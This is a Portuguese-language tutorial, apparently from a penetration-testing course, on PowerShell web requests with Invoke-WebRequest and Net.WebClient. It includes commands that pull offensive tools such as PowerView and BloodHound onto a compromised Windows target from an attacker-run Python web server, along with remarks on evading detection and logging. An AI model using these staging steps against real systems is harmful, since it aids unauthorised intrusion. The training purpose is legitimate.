
Como administrador, podemos automatizar a forma como realizamos atualizações remotas, instalamos aplicativos e muito mais com ferramentas e cmdlets por meio do PowerShell. Isso garantirá que possamos obter o software, as atualizações e outros objetos de que precisamos nos hosts local e remotamente, sem procurá-los manualmente por meio da GUI. Isso nos poupará tempo e nos permitirá administrar remotamente os hosts em vez de sentar em seu teclado ou fazer RDP. Como pentester, esta é uma maneira rápida de obter ferramentas e outros itens de que precisamos no ambiente e exfiltrar dados se tivermos a infraestrutura para enviá-los. Esta seção abordará como interagimos com a Web e mostrará várias maneiras de utilizar o PowerShell para atender a essa finalidade.

## Como interagimos com a Web usando o PowerShell?

Quando se trata de interagir com a Web por meio do PowerShell, o cmdlet Invoke-WebRequest é nosso campeão. Podemos usá-lo para executar solicitações HTTP/HTTPS básicas (como GET e POST), analise páginas HTML, baixe arquivos, autentique e até mesmo mantenha uma sessão com um site. É muito versátil e fácil de usar em scripts e automação. Se você preferir aliases, o cmdlet Invoke-WebRequest é alias para wget, iwr e curl.

```powershell
PS C:\Windows\system32> Get-Help Invoke-Webrequest

NAME
    Invoke-WebRequest

SYNOPSIS
    Gets content from a web page on the Internet.


SYNTAX
    Invoke-WebRequest [-Uri] <System.Uri> [-Body <System.Object>] [-Certificate
    <System.Security.Cryptography.X509Certificates.X509Certificate>] [-CertificateThumbprint <System.String>]
    [-ContentType <System.String>] [-Credential <System.Management.Automation.PSCredential>] [-DisableKeepAlive]
    [-Headers <System.Collections.IDictionary>] [-InFile <System.String>] [-MaximumRedirection <System.Int32>]
    [-Method {Default | Get | Head | Post | Put | Delete | Trace | Options | Merge | Patch}] [-OutFile
    <System.String>] [-PassThru] [-Proxy <System.Uri>] [-ProxyCredential <System.Management.Automation.PSCredential>]
    [-ProxyUseDefaultCredentials] [-SessionVariable <System.String>] [-TimeoutSec <System.Int32>] [-TransferEncoding
    {chunked | compress | deflate | gzip | identity}] [-UseBasicParsing] [-UseDefaultCredentials] [-UserAgent
    <System.String>] [-WebSession <Microsoft.PowerShell.Commands.WebRequestSession>] [<CommonParameters>]

DESCRIPTION
    The `Invoke-WebRequest` cmdlet sends HTTP, HTTPS, FTP, and FILE requests to a web page or web service. It parses
    the response and returns collections of forms, links, images, and other significant HTML elements.

    This cmdlet was introduced in Windows PowerShell 3.0.

    > [!NOTE] > By default, script code in the web page may be run when the page is being parsed to populate the >
    `ParsedHtml` property. Use the `-UseBasicParsing` switch to suppress this.

    > [!IMPORTANT] > The examples in this article reference hosts in the `contoso.com` domain. This is a fictitious >
    domain used by Microsoft for examples. The examples are designed to show how to use the cmdlets. > However, since
    the `contoso.com` sites don't exist, the examples don't work. Adapt the examples > to hosts in your environment.

<SNIP>
```

# Uma solicitação simples da Web

Podemos executar uma solicitação Get básica de um site usando o modificador -Method GET com o cmdlet Invoke-WebRequest, conforme mostrado abaixo. Especificaremos o URI como `https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html` para este exemplo. Também o enviaremos para Get-Member para inspecionar os métodos e propriedades de saída do objeto.

```powershell
PS C:\htb> Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | Get-Member


   TypeName: Microsoft.PowerShell.Commands.HtmlWebResponseObject

----              ---------- ----------
Dispose           Method     void Dispose(), void IDisposable.Dispose()
Equals            Method     bool Equals(System.Object obj)
GetHashCode       Method     int GetHashCode()
GetType           Method     type GetType()
ToString          Method     string ToString()
AllElements       Property   Microsoft.PowerShell.Commands.WebCmdletElementCollection AllElements...
BaseResponse      Property   System.Net.WebResponse BaseResponse {get;set;}
Content           Property   string Content {get;}
Forms             Property   Microsoft.PowerShell.Commands.FormObjectCollection Forms {get;}
Headers           Property   System.Collections.Generic.Dictionary[string,string] Headers {get;}
Images            Property   Microsoft.PowerShell.Commands.WebCmdletElementCollection Images {get;}
InputFields       Property   Microsoft.PowerShell.Commands.WebCmdletElementCollection InputFields...
Links             Property   Microsoft.PowerShell.Commands.WebCmdletElementCollection Links {get;}
ParsedHtml        Property   mshtml.IHTMLDocument2 ParsedHtml {get;}
RawContent        Property   string RawContent {get;set;}
RawContentLength  Property   long RawContentLength {get;}
RawContentStream  Property   System.IO.MemoryStream RawContentStream {get;}
Scripts           Property   Microsoft.PowerShell.Commands.WebCmdletElementCollection Scripts {get;}
StatusCode        Property   int StatusCode {get;}
StatusDescription Property   string StatusDescription {get;}
```

Observe todas as propriedades diferentes que este site possui. Agora podemos filtrá-los se quisermos mostrar apenas uma parte do site. Por exemplo, e se quisermos apenas ver uma listagem das imagens no site? Podemos fazer isso executando a solicitação e, em seguida, filtrando apenas imagens da seguinte forma:

```powershell
PS C:\htb> Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl Images

Images : {@{innerHTML=; innerText=; outerHTML=<IMG alt="Pretty Picture"
         src="example/prettypicture.jpg">; outerText=; tagName=IMG; alt=Pretty Picture;
         src=example/prettypicture.jpg}, @{innerHTML=; innerText=; outerHTML=<IMG alt="Pretty
         Picture" src="example/prettypicture.jpg" align=top>; outerText=; tagName=IMG; alt=Pretty
         Picture; src=example/prettypicture.jpg; align=top}}
```

Agora temos uma lista de fácil leitura das imagens incluídas no site, e podemos baixá-las se quisermos. Esta é uma maneira super fácil de obter apenas as informações que desejamos ver. O conteúdo bruto do site que estamos enumerando se parece com isto:

```powershell
PS C:\htb> Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl RawContent

RawContent : HTTP/1.1 200 OK
             Strict-Transport-Security: max-age=16070400
             X-Content-Type-Options: nosniff
             X-XSS-Protection: 1; mode=block
             X-Frame-Options: SAMEORIGIN
             Accept-Ranges: bytes
             Content-Length: 1807
             Content-Type: text/html
             Date: Thu, 10 Nov 2022 16:25:07 GMT
             ETag: "70f-529340fa7b28d"
             Last-Modified: Wed, 13 Jan 2016 09:47:41 GMT
             Server: Apache/2.4.6 () OpenSSL/1.0.2k-fips

             <html>

             <head>
             <title>A very simple webpage</title>
             <basefont size=4>
             </head>

             <body bgcolor=FFFFFF>

             <h1>A very simple webpage. This is an "h1" level header.</h1>

             <h2>This is a level h2 header.</h2>

             <h6>This is a level h6 header.  Pretty small!</h6>

             <p>This is a standard paragraph.</p>

             <p align=center>Now I've aligned it in the center of the screen.</p>

             <p align=right>Now aligned to the right</p>

             <p><b>Bold text</b></p>

             <p><strong>Strongly emphasized text</strong>  Can you tell the difference vs. bold?</p>

             <p><i>Italics</i></p>

             <p><em>Emphasized text</em>  Just like Italics!</p>

             <p>Here is a pretty picture: <img src=example/prettypicture.jpg alt="Pretty
             Picture"></p>
<SNIP>
```

Poderíamos esculpir o conteúdo bruto deste site em vez de examinar tudo, desde a solicitação, de uma só vez. Observe o quanto é mais fácil de ler? Como uma maneira rápida de reconhecer um site ou extrair informações importantes, como nomes, endereços e e-mails, não fica muito mais fácil do que isso. Onde o Invoke-WebRequest é útil é sua capacidade de baixar arquivos por meio da CLI. Vamos ver como baixar arquivos agora.

## Baixando arquivos usando PowerShell

Seja executando tarefas de administração de sistema, pentesting ou relacionadas à recuperação de desastres, arquivos de todos os tipos inevitavelmente precisarão ser baixados para um host do Windows. Em um engajamento de pentesting, podemos ter comprometido um alvo e querer transferir ferramentas para aquele host para enumerar o ambiente ainda mais e identificar maneiras de chegar a outros hosts e redes. O PowerShell nos oferece algumas opções integradas para fazer isso. Estaremos focando no Invoke-WebRequest para este módulo, mas entenda que há muitas maneiras diferentes (alguns são para isso que foram feitos, outros não são intencionais pelos criadores da ferramenta) podemos realizar solicitações e downloads da web.

```powershell-session
PS C:\> Invoke-WebRequest -Uri "https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" -OutFile "C:\PowerView.ps1"

PS C:\> dir


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          6/5/2021   5:10 AM                PerfLogs
d-r---         7/25/2022   7:36 AM                Program Files
d-r---          6/5/2021   7:37 AM                Program Files (x86)
d-r---         7/30/2022  10:21 AM                Users
d-----         7/21/2022  11:28 AM                Windows
-a----         8/10/2022   9:12 AM        7299504 PowerView.ps1
```

Usar o Invoke-WebRequest é simples; especificamos o cmdlet e a URL exata de um recurso que queremos baixar:

`-Uri "https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"`

Após a URL, especificamos a localização e o nome do arquivo do recurso no sistema Windows do qual estamos baixando:

`-OutFile "C:\PowerView.ps1"`

Também podemos usar o Invoke-WebRequest para baixar arquivos de servidores da Web na rede local ou em uma rede acessível a partir do destino do Windows. É comum encontrar a necessidade de transferir arquivos de nosso host de ataque para um alvo Windows. Um benefício de fazer isso seria se um de nossos objetivos durante um pentest for permanecer o mais furtivo possível, talvez não precisemos gerar solicitações para a Internet que os dispositivos de segurança de rede possam detectar na borda da rede. Se já tivéssemos o PowerView.ps1 armazenado em nosso host de ataque, poderíamos usar um servidor web python simples para hospedar o PowerView.ps1 e baixá-lo do alvo.

### Caminho de exemplo para trazer ferramentas para um ambiente

Se já tivéssemos o PowerView.ps1 armazenado em nosso host de ataque, poderíamos usar um servidor web Python simples para hospedar o PowerView.ps1 e baixá-lo do alvo. Do host de ataque, queremos confirmar se o arquivo já está presente ou precisamos baixá-lo. Neste exemplo, podemos assumir que já está no host de ataque para fins de demonstração.

```shell
casluxd@htb[/htb]$ ls

Dictionaries            Get-HttpStatus.ps1                    Invoke-Portscan.ps1          PowerView.ps1  Recon.psd1
Get-ComputerDetail.ps1  Invoke-CompareAttributesForClass.ps1  Invoke-ReverseDnsLookup.ps1  README.md      Recon.psm1
```

Iniciamos um servidor web python simples no diretório onde o PowerView.ps1 está localizado.

```shell-session
casluxd@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```powershell-session
Invoke-WebRequest -Uri "http://10.10.14.169:8000/PowerView.ps1" -OutFile "C:\PowerView.ps1"
```

Conforme discutido anteriormente, podemos usar o cmdlet Invoke-WebRequest para enviar comandos para hosts remotos. Isso pode ser bastante útil, especialmente quando descobrimos vulnerabilidades que nos permitem executar comandos em um alvo do Windows, mas podem não ter acesso por meio de um shell interativo ou sessão de área de trabalho remota. Isso pode permitir o download de arquivos no host de destino, permitindo-nos acessar ainda mais esse destino e passar para outros na rede.

## E se não pudermos usar o Invoke-WebRequest?

Então, o que acontece se formos impedidos de usar o Invoke-WebRequest por algum motivo? Não se preocupe, o Windows fornece vários métodos diferentes para interagir com clientes da web. O primeiro e mais desafiador caminho de interação é utilizar a classe .Net.WebClient. Essa classe prática é uma chamada .Net que podemos utilizar conforme o Windows usa e entende .Net. Essa classe contém métodos system.net padrão para interagir com recursos por meio de um URI (endereços da web como github.com/project/tool.ps1). Vejamos um exemplo:

```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadFile("https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip", "Bloodhound.zip")

PS C:\htb> ls

    Directory: C:\Users\MTanaka

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---          11/10/2022 10:45 AM      108511752 Bloodhound.zip
-a---           6/14/2022  8:22 AM           4418 passwords.kdbx
-a---            9/9/2020  4:54 PM         696576 Start.exe
-a---           9/11/2021 12:58 PM              0 sticky.gpr
-a---          11/10/2022 10:44 AM      108511752 test.zip
```

Então funcionou. Vamos detalhar o que fizemos:
- Primeiro, temos a base de download (New-Object Net.WebClient).DownloadFile(), que é como dizemos para executar nossa solicitação.
- A seguir, precisamos incluir a URI do arquivo que queremos baixar como primeiro parâmetro no (). Para este exemplo, foi "https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip".
- Finalmente, precisamos informar ao comando onde queremos que o arquivo seja gravado com o segundo parâmetro, "BloodHound.zip".

O comando acima teria baixado o arquivo para o diretório atual em que estamos trabalhando como Bloodhound.zip. Olhando para o nosso terminal, podemos ver que ele foi executado com sucesso porque o arquivo Bloodhound.zip agora existe em nosso diretório de trabalho. Se quiséssemos colocá-lo em outro lugar, teríamos que especificar o caminho completo. A partir daqui, podemos extrair as ferramentas e executá-las como acharmos melhor. Lembre-se de que isso é barulhento porque você terá solicitações da Web entrando e saindo de sua rede junto com leituras e gravações de arquivos, portanto, ele deixará logs. Se suas transferências são feitas localmente, apenas host para host, por exemplo, você só deixa logs nesses hosts, que são um pouco mais difíceis de filtrar e deixam menos rastros, já que não estamos gravando logs de entrada/saída no cliente limite.